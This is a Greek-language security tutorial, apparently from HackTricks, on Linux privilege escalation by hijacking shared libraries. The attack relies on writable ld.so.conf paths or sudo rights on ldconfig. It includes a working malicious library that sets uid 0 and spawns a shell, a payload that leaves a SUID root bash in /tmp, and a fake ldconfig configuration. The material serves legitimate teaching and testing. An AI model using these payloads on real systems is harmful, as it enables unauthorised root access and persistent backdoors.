# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Προετοιμάστε το περιβάλλον

Στην ακόλουθη ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για να προετοιμάσουμε το περιβάλλον

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιούργησε** αυτά τα αρχεία στο μηχάνημά σου στον ίδιο φάκελο
2. **Μεταγλώττισε** τη **βιβλιοθήκη**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντέγραψε** το `libcustom.so` στο `/usr/lib` και ανανέωσε την cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Μεταγλώττισε** το **εκτελέσιμο**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Έλεγξε το environment

Έλεγξε ότι το _libcustom.so_ **φορτώνεται** από το _/usr/lib_ και ότι μπορείς να **εκτελέσεις** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Όταν επιτίθεσαι σε έναν πραγματικό στόχο, επαλήθευσε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary και τι **επιλύει αυτή τη στιγμή** ο loader:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Μερικά χρήσιμα gotchas:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν δουλεύει** επειδή
το redirection γίνεται από το τρέχον shell σου. Χρησιμοποίησε
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` αντί γι’ αυτό.
- Τα **SUID/privileged** binaries αγνοούν τα `LD_LIBRARY_PATH`/`LD_PRELOAD` σε
**secure-execution mode**, αλλά οι directories που προέρχονται από το `/etc/ld.so.conf` είναι
ακόμα μέρος της trusted loader configuration, οπότε αυτό το misconfiguration μπορεί
παρ’ όλα αυτά να επηρεάσει privileged programs.
- Σε νεότερες εκδόσεις glibc, το dynamic loader εκθέτει επίσης το
`--list-diagnostics`, που είναι χρήσιμο για να κάνεις debug το cache resolution και την
επιλογή του `glibc-hwcaps` subdirectory όταν ένα hijack δεν συμπεριφέρεται όπως
αναμένεται.

## Exploit

Σε αυτό το σενάριο θα υποθέσουμε ότι **κάποιος έχει δημιουργήσει μια ευάλωτη εγγραφή** μέσα σε ένα αρχείο στο _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι _/home/ubuntu/lib_ (όπου έχουμε δικαίωμα εγγραφής).\
**Κατεβάστε και κάντε compile** τον παρακάτω κώδικα μέσα σε αυτό το path:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Αν περιμένεις ότι ο **root** (ή κάποιος άλλος προνομιούχος λογαριασμός) θα εκτελέσει αργότερα το vulnerable binary, συνήθως είναι καλύτερο να αφήσεις ένα **root-owned artifact** αντί να ανοίξεις ένα interactive shell. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Έπειτα, αφού συμβεί η προνομιακή εκτέλεση, μπορείς να χρησιμοποιήσεις `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει τη malicious libcustom library μέσα στο misconfigured** path, πρέπει να περιμένουμε ένα **reboot** ή ο root user να εκτελέσει το **`ldconfig`** (_σε περίπτωση που μπορείς να εκτελέσεις αυτό το binary ως **sudo** ή έχει το **suid bit** θα μπορείς να το εκτελέσεις μόνος σου_).

Μόλις συμβεί αυτό, **recheck** από πού το `sharedvuln` executable φορτώνει το `libcustom.so` library:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, **το φορτώνει από `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κάνει privilege escalation, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας το root ή άλλον privileged user να εκτελέσει το vulnerable binary** θα μπορέσουμε να κάνουμε privilege escalation.

### Άλλες misconfigurations - Same vuln

Στο προηγούμενο παράδειγμα, δημιουργήσαμε ψευδώς μια misconfiguration όπου ένας administrator **έβαλε έναν μη-privileged φάκελο μέσα σε ένα configuration file μέσα στο `/etc/ld.so.conf.d/`**.\
Αλλά υπάρχουν και άλλες misconfigurations που μπορούν να προκαλέσουν την ίδια vulnerability, αν έχετε **write permissions** σε κάποιο **config file** μέσα στο `/etc/ld.so.conf.d`s, στον φάκελο `/etc/ld.so.conf.d` ή στο αρχείο `/etc/ld.so.conf` μπορείτε να διαμορφώσετε την ίδια vulnerability και να την εκμεταλλευτείτε.

## Exploit 2

**Υποθέστε ότι έχετε sudo privileges πάνω στο `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **από πού να φορτώσει τα conf files**, ώστε να το εκμεταλλευτούμε για να κάνουμε το `ldconfig` να φορτώσει arbitrary folders.\
Άρα, ας δημιουργήσουμε τα αρχεία και τους φακέλους που χρειάζονται για να φορτωθεί το "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **previous exploit**, **δημιούργησε τη malicious library μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού ο binary φορτώνει τη library:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως βλέπεις, έχοντας sudo δικαιώματα στο `ldconfig` μπορείς να εκμεταλλευτείς την ίδια ευπάθεια.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
